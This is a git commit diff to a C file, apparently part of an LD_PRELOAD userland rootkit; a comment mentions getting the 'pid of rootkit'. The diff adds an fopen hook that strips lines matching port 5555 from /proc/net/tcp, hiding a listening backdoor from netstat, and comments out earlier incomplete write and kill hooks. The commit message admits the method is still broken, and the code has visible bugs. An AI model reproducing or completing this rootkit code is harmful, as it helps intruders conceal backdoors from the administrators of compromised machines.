c8cd5f213ee25075fcce87ac55d8fbddc17b39e1
lain <tbkopera@proton.me>
2024-12-18 22:55:04 +0000

    new but still broken method for hiding from netstat

--- poilib.c
+++ poilib.c
@@ -3,7 +3,39 @@
 #include <unistd.h>
 #include <string.h>
 
-ssize_t write(int fd, const void *buf, size_t count){
+#define KEY_PORT "15B3"
+
+FILE *(*orig_fopen)(const char *pathname,const char mode);
+FILE *fopen(const char *pathname, const char *mode){
+
+    orig_fopen=dlsym(RTLD_NEXT,"fopen");
+
+    char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+
+    FILE *fp;
+
+    if (ptr_tcp!=NULL){
+        char line[256];
+        FILE *temp = tmpfile();
+        fp =orig_fopen(pathname,mode);
+        while(fgets(line,sizeof(line),fp)){
+            char *listener = strstr(line,KEY_PORT);
+            if(listener!=NULL){
+                continue;
+            }
+            else{
+                fputs(line,temp);
+            }
+        }
+        return temp;
+    }
+    fp=orig_fopen(pathname,mode);
+    return fp;
+}
+
+
+
+/*ssize_t write(int fd, const void *buf, size_t count){
 	ssize_t (*new_write) (int fd, const void *buf, size_t count);
 
 	ssize_t result;
@@ -11,6 +43,7 @@ ssize_t write(int fd, const void *buf, size_t count){
 /* get pid of rootkit
  use that to match against the write*/
 
+/*
 	new_write=dlsym(RTLD_NEXT, "write");
 	if(strcmp(buf, "pid")){
 		result = NULL;
@@ -20,12 +53,13 @@ ssize_t write(int fd, const void *buf, size_t count){
 	}
 	return result;
 }
+*/
 
-int kill(pid_t pid, int sig){
+/*int kill(pid_t pid, int sig){
 	int (*new_kill) (pid_t pid, int sig);
 
 	long result;
 
 	new_kill=dlsym(RTLD_NEXT,"kill");
 }
-
+*/
